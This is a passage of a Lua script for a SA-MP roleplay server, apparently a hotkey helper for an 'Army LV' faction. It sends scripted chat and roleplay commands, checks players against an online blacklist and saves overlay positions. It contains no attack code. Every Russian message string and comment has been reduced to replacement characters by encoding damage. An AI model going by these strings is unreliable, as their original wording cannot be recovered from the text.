										["4"] = "� Police LV", ["lv"] = "� Police LV", ["lvpd"] = "� Police LV", ["��"] = "� Police LV", ["����"] = "� Police LV",
										["5"] = "� FBI", ["fbi"] = "� FBI", ["���"] = "� FBI",
										["6"] = "� Army SF", ["sfa"] = "� Army SF", ["���"] = "� Army SF",
										["7"] = "� �. San-Fierro", ["sf"] = "� �. San-Fierro", ["��"] = "� �. San-Fierro"
								}

								local kv = kvadrat()
								if arr[res] ~= nil then sampSendChat("/f " .. tag .. " �������� �������������� � �������� " .. kv .. " � ���������� ���� " .. arr[res] .. "") else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������.", 0xFFFF0000)	end
						end

						if res == "7" then
								if not showdialog(1, "������� ����/�������", "\n[0] - ������� �������\n[1] - ������� ����", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 1))then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								local kv = kvadrat()
								if res == "0" then sampSendChat("/f " .. tag .. " ������� " .. kv .. " �������. ���������� ������� ��������������") else sampSendChat("/f " .. tag .. " ������� " .. kv .. " ����. ���������� ������� �� ����������") end
						end						
				end
		)
end

function hk_4()
	lua_thread.create(function()
		local key = CTaskArr["CurrentID"]
		if key == 0 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� �� �������.", 0xFFFF0000) return end
		if isKeyDown(makeHotKey(4)[1]) then
			wait(300)
			if isKeyDown(makeHotKey(4)[1]) then goto done end
		end

		if CTaskArr[1][key] == 1 then 
			sampSendChat("/f " .. tag .. " �������, " .. CTaskArr[3][key] .. "!")
			CTaskArr[10][1] = CTaskArr[3][key]
		end
		if CTaskArr[1][key] == 2 then sampSendChat("/f " .. tag .. " �������, " .. CTaskArr[3][key] .. "!") end
		if CTaskArr[1][key] == 3 then sampSendChat("/clist 7") wait(1300) sampSendChat("/me �����" .. RP .. " " .. config_ini.UserClist[7] .. "") end
		if CTaskArr[1][key] == 4 then sampSendChat("/f " .. tag .. " ������� � ������������� ��� " .. CTaskArr[3][key] .. "") end
		if CTaskArr[1][key] == 5 then sampSendChat("/f " .. tag .. " ����" .. RP .. " ��������, ������ " .. CTaskArr[10][2][1][1] .. ", ���������� �� ��") end
		if CTaskArr[1][key] == 6 then sampSendChat("/f " .. tag .. " ������" .. RP .. " �������� � �����, ������ " .. CTaskArr[3][key] .. "") end
		if CTaskArr[1][key] == 7 then sampSendChat("/f " .. tag .. " ������������ �� ����� " .. CTaskArr[3][key] .. ", " .. CTaskArr[10][3] .. " ����. ") end
		if CTaskArr[1][key] == 8 then sampSendChat("/repairkit") end
		if CTaskArr[1][key] == 9 then sampSendChat("/f " .. tag .. " ����" .. RP .. " ��������, ��� " .. clists[sampGetPlayerColor(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))] .. ".") end
		if CTaskArr[1][key] == 10 then sampSendChat("/f " .. tag .. " ������� " .. CTaskArr[3][key] .. " �������. ���������� ������� ��������������") end
		if CTaskArr[1][key] == 11 then sampSendChat("/f " .. tag .. " ������" .. RP .. " ��������.") end
			
		::done::
		table.remove(CTaskArr[1], key)
		table.remove(CTaskArr[2], key)
		table.remove(CTaskArr[3], key)
		CTaskArr["CurrentID"] = 0
		while isKeyDown(0x5D) do wait(0) end
	end)
end

function hk_5()
		lua_thread.create(
				function()
						wait(0)
						sampSendChat("������� �����! " .. config_ini.Settings.PlayerRank .. " " .. config_ini.Settings.PlayerFirstName .. " " .. config_ini.Settings.PlayerSecondName .. "")
						wait(1600)
						sampSendChat("���������� ���� ���������")
				end
		)
end

function hk_6()
		lua_thread.create(
				function()
						wait(0)
						local A_Index = 0
						local c = ismegaphone() and "/m" or "/s"
						while true do
								if A_Index == 20 then break end
								local text = sampGetChatString(99 - A_Index)

								local re1 = regex.new("(.*)\\_(.*) ��������?\\: ��������\\! ��� ������ �������� ��������� ��������� �� ����� ����� ������� ����� �� ���������\\!\\!\\!")
								local re2 = regex.new("\\{\\{ ������ (.*)\\_(.*)\\: ��������\\! ��� ������ �������� ��������� ��������� �� ����� ����� ������� ����� �� ���������\\! \\}\\}")
								if re1:match(text) ~= nil or re2:match(text) ~= nil then sampSendChat("" .. c .. " ������ ���������� �� ��������� ���������! ��� �� ������� ����� �� ���������!") return end
								A_Index = A_Index + 1
						-- Aleksandr_Belka �������: ��������! ��� ������ �������� ��������� ��������� �� ����� ����� ������� ����� �� ���������!!!
						-- Aleksandr_Belka ������: ��������! ���������� ������������!!!
						-- {{ ������ Aleksandr_Belka: ��������! ���������� ������������! }}
						end
						sampSendChat("" .. c .. " ��������! ��� ������ �������� ��������� ��������� �� ����� ����� ������� ����� �� ���������!")
				end
		)
end

function hk_7()
		lua_thread.create(
				function()
						wait(0)
						local A_Index = 0
						local c = ismegaphone() and "/m" or "/s"
						local text = isCharInAnyCar(PLAYER_PED) and "��������, ���������� ������������!" or "������!"
						local text2 = isCharInAnyCar(PLAYER_PED) and "��������, ���������� ������������! ��� �� ������� ����� �� ���������!" or "������! �������� ����!"
						while true do
								if A_Index == 20 then break end
								local ch = sampGetChatString(99 - A_Index)
								local re = regex.new("(.*\\_.* ��������?|\\{\\{ ������ .*\\_.*)\\: (��������, ���������� ������������|������)\\!(\\!\\!| \\}\\})")
								--[[ local re1 = regex.new("(.*)\\_(.*) ��������?\\: ��������\\! ���������� ������������\\!\\!\\!")
								local re2 = regex.new("\\{\\{ ������ (.*)\\_(.*)\\: ��������\\! ���������� ������������\\! \\}\\}") ]]
								if re:match(ch) ~= nil then sampSendChat("" .. c .. " " .. text2 .. "") return end
								A_Index = A_Index + 1
						-- Aleksandr_Belka �������: ��������! ���������� ������������!!!
						-- {{ ������ Aleksandr_Belka: ��������! ���������� ������������! }}
						end
						sampSendChat("" .. c .. " " .. text .. "")
				end
		)
end

function hk_8()
		lua_thread.create(
				function()
						wait(0)
						local A_Index = 0
						local c = ismegaphone() and "/m" or "/s"
						if not isCharInArea2d(PLAYER_PED, -84, 1606, 464, 2148, false) then
							sampSendChat("" .. c .. " ��������! �� ������ ������� ����������� �������! ��� � �����������, ������� ����� �� ���������!")
						else
							while true do
									if A_Index == 20 then break end
									local text = sampGetChatString(99 - A_Index)
									local re1 = regex.new("(.*)\\_(.*) ��������?\\: ��������\\! �� ���������� �� ���������� ����������\\! ���������� �������� �\\!\\!\\!")
									local re2 = regex.new("\\{\\{ ������ (.*)\\_(.*)\\: ��������\\! �� ���������� �� ���������� ����������\\! ���������� �������� �\\! \\}\\}")
									if re1:match(text) ~= nil or re2:match(text) ~= nil then sampSendChat("" .. c .. " ������ �������� ���������� ����������! ��� �� ������� ����� �� ���������!") return end
									A_Index = A_Index + 1
							-- Aleksandr_Belka �������: ��������! ���������� ������������!!!
							-- {{ ������ Aleksandr_Belka: ��������! ���������� ������������! }}
							end
							sampSendChat("" .. c .. " ��������! �� ���������� �� ���������� ����������! ���������� �������� �!")
						end
				end
		)
end

function hk_9()
		local c = ismegaphone() and "/m" or "/s"
		sampSendChat("" .. c .. " ���� ������! ���� �����, ������� ������, ����� � ���! �������� \"�.�.�.�.\"!")
end

function hk_10()
		lua_thread.create(
				function()
						if not showdialog(1, "����� �����", "0-33", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						local res = waitForChooseInDialog(1)
						if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 33)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end

						local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
						if not result then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ���� ID", 0xFFFF0000) return end
						local myclist = clists[sampGetPlayerColor(myid)]
						if myclist == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ����� ������ �����", 0xFFFF0000) return end
						if tonumber(res) == myclist then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ���� ������ ���� �����.", 0xFFFF0000) return end
						local result, sid = sampGetPlayerSkin(myid)
						if not result then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ID ������ �����", 0xFFFF0000) return end
						if ((sid == 287 or sid == 191) and myclist ~= 7 and myclist ~= 0) or (myclist ~= 0 and (sid ~= 287 and sid ~= 191)) then
								sampSendChat("/me ����" .. RP .. " " .. config_ini.UserClist[myclist] .. "")
								wait(1300)
						end

						sampSendChat("/clist " .. res .. "")
						if ((tonumber(res) == 7) and ((sid == 287) or (sid == 191))) or (tonumber(res) == 0) then return end

						wait(1300)
						sampSendChat("/me �����" .. RP .. " " .. config_ini.UserClist[tonumber(res)] .. "")
				end
		)
end

function hk_11()
		lua_thread.create(
				function()
						math.randomseed(os.time())
						local var = math.random(1, 3)
						if var == 1 then
							 sampSendChat("/me ������" .. RP .. " ��-8")
							 wait(delay)
							 sampSendChat("/me ������" .. RP .. " ���� � ���� \"���������\"")
							 wait(delay)
							 sampSendChat("/do ���� ����� �� ����� ������� ����")
							 wait(delay)
							 sampSendChat("/do ���� ������� �� ����� ������� ������ ������")
							 wait(delay)
							 sampSendChat("/me ���������" .. RP .. " ����� ������� ������")
							 wait(delay)
							 sampSendChat("/do ���� �������" .. RP .. " ��-8 �������, ������� ��� � ��")
					elseif var == 2 then
							 sampSendChat("/me ������" .. RP .. " ��-8")
							 wait(delay)
							 sampSendChat("/me ������" .. RP .. " �������� �������� �������� � ����� � �����")
							 wait(delay)
							 sampSendChat("/do ���� ����� ��������-��������������")
							 wait(delay)
							 sampSendChat("/do ���� ����� �������� �����")
							 wait(delay)
							 sampSendChat("/me �������" .. RP .. " ����� �������, ������ �")
							 wait(delay)
							 sampSendChat("/do ���� ������� ��-8 �������, ������� ��� � ��")
					elseif var == 3 then
							 sampSendChat("/me ������" .. RP .. " ��-8")
							 wait(delay)
							 sampSendChat("/me ������" .. RP .. " ��������, ����� � ���")
							 wait(delay)
							 sampSendChat("/do ���� ��������� ����� ������� �����")
							 wait(delay)
							 sampSendChat("/do ���� ������� �������� �� ����� �������")
							 wait(delay)
							 sampSendChat("/me ������" .. RP .. " ��� �������")
							 wait(delay)
							 sampSendChat("/do ���� ������� ��-8 �������")
					end

					RKTimerTickCount = os.time()
			end
		)
end

function hk_12()
		lua_thread.create(
				function()
						sampSendChat("/me �������" .. RP .. " ������������� � �������� ����")
						wait(delay)
						isSending = true
						sampSendChat("/do � �������������: Army LV | " .. config_ini.Settings.PlayerFirstName .. " " .. config_ini.Settings.PlayerSecondName .. " | " .. config_ini.Settings.PlayerRank .. " | " .. PlayerU .. "")
						isSending = false
					end
		)
end

function hk_13()
		if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then sampSendChat("/lock") end
end

function hk_14()

end

function hk_16()

end

function hk_17()

end

function hk_18()

end

function hk_19()
		lua_thread.create(
				function()
						local valid, ped = getCharPlayerIsTargeting(PLAYER_HANDLE) -- �������� ����� ���������, � �������� ������� �����
						local id
						if not valid or not doesCharExist(ped) then -- ���� ���� ���� � �������� ����������
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� �� �������. �������� ���������� ����.", 0xFFFF0000)
								if not showdialog(1, "����� ������ � /members", "ID 0-999", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								local res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 999)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								id = tonumber(res)
						else
								local result, id = sampGetPlayerIdByCharHandle(ped) -- �������� samp-�� ������ �� ������ ���������
								if not result then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ID ����", 0xFFFF0000) return end
						end

						if not sampIsPlayerConnected(id) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local Members1Text = getMembersText()
						local nick = sampGetPlayerNickname(id)
						local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
						clist = clist == "ffff" and "fffafa" or clist
						for v in Members1Text:gmatch('[^\n]+') do
								local _, zv, afk = v:match("%[%d+%] %[(%d+)%] " .. nick .. "	(%W*) %[%d+%](.*)")
								if zv ~= nil then afk = afk == nil and "" or afk sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. nick .. "[" .. id .. "] {FFFAFA}- " .. zv .. " " .. afk .. "", 0xFFFF0000) return end
						end

						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. nick .. "[" .. id .. "] {FFFAFA}- �� ������ � members", 0xFFFF0000)
				end
		)
end

function hk_20()
	lua_thread.create(function()
		wait(0)
		local A_Index = 0
		while true do
			if A_Index == 30 then break end
			local text = sampGetChatString(99 - A_Index)
			local re1
			if config_ini.bools[39] == 1 then re1 = regex.new(" \\{8470FF\\}(.*) \\{.*\\}(.*)\\_(.*)\\[(.*)\\]\\{8470FF\\}:  (.*)((.*)������(.*)���|(.*)������(.*)����(.*)���|(.*)������(.*)������(.*)|(.*)������(.*)����(.*)������(.*)|(.*)������(.*)����(.*)����(.*)|(.*)������(.*)����(.*)|(.*)������(.*)����(.*)���(.*)|(.*)������(.*)���(.*))") else re1 = regex.new(" (.*)  (.*)\\_(.*)\\[(.*)\\]:  (.*)((.*)������(.*)���|(.*)������(.*)����(.*)���|(.*)������(.*)������(.*)|(.*)������(.*)����(.*)������(.*)|(.*)������(.*)����(.*)����(.*)|(.*)������(.*)����(.*)|(.*)������(.*)����(.*)���(.*)|(.*)������(.*)���(.*))") end
			local zv, _, sname = re1:match(text)
			
			if zv ~= nil then
				local ranksnesokr = {["��.�������"] = "������� �������", ["��.�������"] = "������� �������", ["��.���������"] = "������� ���������", ["��.���������"] = "������� ���������"}
				local pRank = ranksnesokr[zv] ~= nil and ranksnesokr[zv] or zv
				sampSendChat("/f " .. tag .. " ������� �����, ������� " .. pRank .. " " .. sname .. "!")
				return
			end
			A_Index = A_Index + 1
		end
		
		sampSendChat("/f " .. tag .. " ������� �����!")
	end)
end

function hk_21()
		sampSendChat("/f " .. tag .. " SOS " .. kvadrat() .. "")
end

function hk_22()
		lua_thread.create(
				function()
						local res, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
						if not res then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ���� ID", 0xFFFF0000) return end
						local myclist = clists[sampGetPlayerColor(myid)]
						if myclist == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ����� ������ �����", 0xFFFF0000) return end
						if myclist == 0 then
								sampSendChat("/clist " .. useclist .. "")
								wait(1300)
								local newmyclist = clists[sampGetPlayerColor(myid)]
								if newmyclist == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ����� ������ �����", 0xFFFF0000) return end
								if newmyclist ~= tonumber(useclist) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �� ��� �����", 0xFFFF0000) return end
								sampSendChat("/me �����" .. RP .. " " .. config_ini.UserClist[newmyclist] .. "")
						else
								sampSendChat("/clist 0")
								wait(1300)
								local newmyclist = clists[sampGetPlayerColor(myid)]
								if newmyclist == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ����� ������ �����", 0xFFFF0000) return end
								if newmyclist ~= 0 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �� ��� ����", 0xFFFF0000) return end
								sampSendChat("/me ����" .. RP .. " " .. config_ini.UserClist[myclist] .. "")
						end
				end
		)
end

function hk_23()
		lua_thread.create(
				function()
						wait(0)
						if not showdialog(1, "���� ��������", "�������� �����\n[1] - ��������� ��������\n[2] - ���������� ��������\n[3] - ������ � ��������� ���������\n[4] - ������ � ������ ��/�������� � ����", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						local res = waitForChooseInDialog(1)
						if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 1 or tonumber(res) > 4)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
						if type(tonumber(res)) ~= "number" or tonumber(res) < 1 or tonumber(res) > 4 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ����� �� 1 �� 4.", 0xFFFF0000) return end
						local res = tonumber(res)
						if res == 1 then sampSendChat("/me ����" .. RP .. " ����� �� ������") wait(delay) sampSendChat("/me ��������" .. RP .. " ����� � ��������") end
						if res == 2 then sampSendChat("/me ����" .. RP .. " ����� � ���������") wait(delay) sampSendChat("/me ���������" .. RP .. " ����� �� �����") end
						if res == 3 then
								local A_Index = 0
								while true do
										if A_Index == 30 then break end
										local text = sampGetChatString(99 - A_Index)
										local sklad, kol = text:match(" �� ������ (.*)%: (%d%d%d)%d%d%d%/%d+")
										if sklad ~= nil then sampSendChat("/f " .. tag .. " ������������ �� ����� " .. sklad .. ", " .. kol .. " ����. ") return end
										A_Index = A_Index + 1
								end
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ���������� ���������� ��������", 0xFFFF0000)
						end
						if res == 4 then
								local X, Y = getCharCoordinates(playerPed)
								if X >= 276 and Y >= 1799 and X <= 389 and Y <= 2014 then
										sampSendChat("/f " .. tag .. " �����, ��������, �������� ���")
								else
										sampSendChat("/f " .. tag .. " �����, ��������, ���������� ���")
								end
						end
				end
		)
end

function hk_24()

end

function hk_25()
		lua_thread.create(
				function()
						local valid, ped = getCharPlayerIsTargeting(PLAYER_HANDLE) -- �������� ����� ���������, � �������� ������� �����
						local id
						local nick = ""
						if not valid or not doesCharExist(ped) then -- ���� ���� ���� � �������� ����������
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� �� �������. �������� ���������� ����.", 0xFFFF0000)
								if not showdialog(1, "����� ������ � ��", "ID 0-999 ��� ���", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								local res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 999)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								if tonumber(res) == nil then nick = res else id = tonumber(res) end
						else
								local result, id = sampGetPlayerIdByCharHandle(ped) -- �������� samp-�� ������ �� ������ ���������
								if not result then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ID ����", 0xFFFF0000) return end
						end

						if nick == "" then
								if not sampIsPlayerConnected(id) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
								nick = sampGetPlayerNickname(id)
								id = tostring(id)
						else
								id = sampGetPlayerIdByNickname(nick) ~= nil and tostring(sampGetPlayerIdByNickname(nick)) or "-1"
						end

						if config_ini.bools[2] == 1 then
								sampSendChat("/me ������" .. RP .. " ����� �� ������ OPSAT")
								wait(delay)
								sampSendChat("/me ��������" .. RP .. " ����� � ������ ������ ����� �� �� �����")
						end

						local url = 'http://srp-addons.ru/api/log.php?checkbl=' ..  nick .. '&f=Army%20LV&s=185.169.134.11:7777'
						local responsetext = req(url)
						local reas, when, who = responsetext:match("\"reason\":\"(.*)\",\"date\":\"(.*)\",\"user\":\"(.*)\"")
						if reas ~= nil then
								sampAddChatMessage("{FF8300}-----------=== ������ ������ Las-Venturas army ===-----------", 0xFFFF0000)
								sampAddChatMessage("{FF8300}�����: {FFFFFF}" .. nick .. " [" .. id .. "]{FF0000} ������ � ������ ������", 0xFFFF0000)
								sampAddChatMessage("{FF8300}�������: {FFFFFF}" .. reas .. "", 0xFFFF0000)
								sampAddChatMessage("{FF8300}��� ����: {FFFFFF}" .. who .. "", 0xFFFF0000)
								sampAddChatMessage("{FF8300}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
					 	else
								sampAddChatMessage("{FF8300}Black List: �����: {FFFFFF}" .. nick .. " [" .. id .. "]{33AA33} � ������ ������ �� ������", 0xFFFF0000)
						end
				end
		)
end

function hk_26()
		lua_thread.create(
				function()
						sampSendChat("������� �����!")
						if config_ini.bools[3] ~= 1 then return end
						local res, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
						if res then
								local res, sid = sampGetPlayerSkin(myid)
								if res and (sid == 191 or sid == 287) and not isCharInAnyCar(PLAYER_PED) then
									wait(delay)
									sampSendChat("q")
								end
						end
				end
		)
end

function hk_27()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[1])
						if SB == nil then return end
						if (config_ini.bools[4] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_28()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[2])
						if SB == nil then return end
						if (config_ini.bools[5] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_29()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[3])
						if SB == nil then return end
						if (config_ini.bools[6] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_30()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[4])
						if SB == nil then return end
						if (config_ini.bools[7] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_31()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[5])
						if SB == nil then return end
						if (config_ini.bools[8] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_32()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[6])
						if SB == nil then return end
						if (config_ini.bools[9] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_33()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[7])
						if SB == nil then return end
						if (config_ini.bools[10] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_34()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[8])
						if SB == nil then return end
						if (config_ini.bools[11] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_35()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[9])
						if SB == nil then return end
						if (config_ini.bools[12] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_36()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[10])
						if SB == nil then return end
						if (config_ini.bools[13] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_37()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[11])
						if SB == nil then return end
						if (config_ini.bools[14] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_38()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[12])
						if SB == nil then return end
						if (config_ini.bools[15] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_39()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[13])
						if SB == nil then return end
						if (config_ini.bools[16] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_40()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[14])
						if SB == nil then return end
						if (config_ini.bools[17] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_41()
	if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then needtohold = not needtohold end
end

function hk_42()
		lua_thread.create(
				function()
						local tarr = {}
						for k, v in ipairs(config_ini.rphr) do if v ~= "" then table.insert(tarr, v) end end
						math.randomseed(os.time())
						local num = math.random(1, table.maxn(tarr))
						if num == lastrand then if num == table.maxn(tarr) then num = 1 else num = num + 1 end end
						local SB = formatbind(tarr[num])
						if SB == nil then return end
						lastrand = num
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function hk_43()
		if not SetMode then
				-- ��� ����� ����� ������� �������
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������� �������������� ��������� overlay", 0xFFFF0000)
				if isCharInAnyCar(PLAYER_PED) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ �� ����� �������� ��� ��������� ��������", 0xFFFF0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}��� ������ �� ����� ���� ��������� ���������� ����� � ���������", 0xFFFF0000) end
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� �������� � ������ ����� � ������� ������� ��������� - ���������� ���������� ���������", 0xFFFF0000)
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}��� ������ ���� ��������� ������� ������� ������ ����", 0xFFFF0000)
				config_ini.bools[25], config_ini.bools[26], config_ini.bools[27], config_ini.bools[28], config_ini.bools[29], config_ini.bools[30], config_ini.bools[31], config_ini.bools[32], config_ini.bools[33], config_ini.bools[34], config_ini.bools[35], config_ini.bools[36], config_ini.bools[41], config_ini.bools[43], config_ini.bools[44], config_ini.bools[52] = 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1
				if alevel == 3 or alevel == 6 then config_ini.bools[58] = 1 end
				SetMode, SetModeFirstShow = true, true
				imgui.ShowCursor, imgui.LockPlayer = true, true
		else
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ���������� ���������", 0xFFFF0000)
				config_ini.ovCoords.show_timeX, config_ini.ovCoords.show_timeY = s_time.x, s_time.y
				config_ini.ovCoords.show_placeX, config_ini.ovCoords.show_placeY = s_place.x, s_place.y
				config_ini.ovCoords.show_nameX, config_ini.ovCoords.show_nameY = s_name.x, s_name.y
				if isCharInAnyCar(PLAYER_PED) then config_ini.ovCoords.show_vehX, config_ini.ovCoords.show_vehY = s_veh.x, s_veh.y end
				config_ini.ovCoords.show_hpX, config_ini.ovCoords.show_hpY = s_hp.x, s_hp.y
				config_ini.ovCoords.crosCarX, config_ini.ovCoords.crosCarY = s_targetCar.x, s_targetCar.y
				config_ini.ovCoords.show_targetImageX, config_ini.ovCoords.show_targetImageY = s_target.x, s_target.y
				config_ini.ovCoords.show_rkX, config_ini.ovCoords.show_rkY = s_rk.x, s_rk.y
				config_ini.ovCoords.show_afkX, config_ini.show_afkY = s_afk.x, s_afk.y
				config_ini.ovCoords.show_tecinfoX, config_ini.ovCoords.show_tecinfoY = s_tecinfo.x, s_tecinfo.y
				config_ini.ovCoords.show_squadX, config_ini.ovCoords.show_squadY = s_squad.x, s_squad.y
				config_ini.ovCoords.show_500X, config_ini.ovCoords.show_500Y = s_500.x, s_500.y
				config_ini.ovCoords.show_dindX, config_ini.ovCoords.show_dindY = s_dind.x, s_dind.y
				config_ini.ovCoords.show_damX, config_ini.ovCoords.show_damY = s_dam.x, s_dam.y
				config_ini.ovCoords.show_deathX, config_ini.ovCoords.show_deathY = s_death.x, s_death.y
				if alevel == 3 or alevel == 6 then config_ini.ovCoords.show_moneyX, config_ini.ovCoords.show_moneyY = s_money.x, s_money.y end

				config_ini.bools[25] = togglebools.tab_overlay[1].v and 1 or 0
				config_ini.bools[26] = togglebools.tab_overlay[2].v and 1 or 0
				config_ini.bools[27] = togglebools.tab_overlay[3].v and 1 or 0
				config_ini.bools[28] = togglebools.tab_overlay[4].v and 1 or 0
				config_ini.bools[29] = togglebools.tab_overlay[5].v and 1 or 0
				config_ini.bools[30] = togglebools.tab_overlay[6].v and 1 or 0
				config_ini.bools[31] = togglebools.tab_overlay[7].v and 1 or 0
				config_ini.bools[32] = togglebools.tab_overlay[8].v and 1 or 0
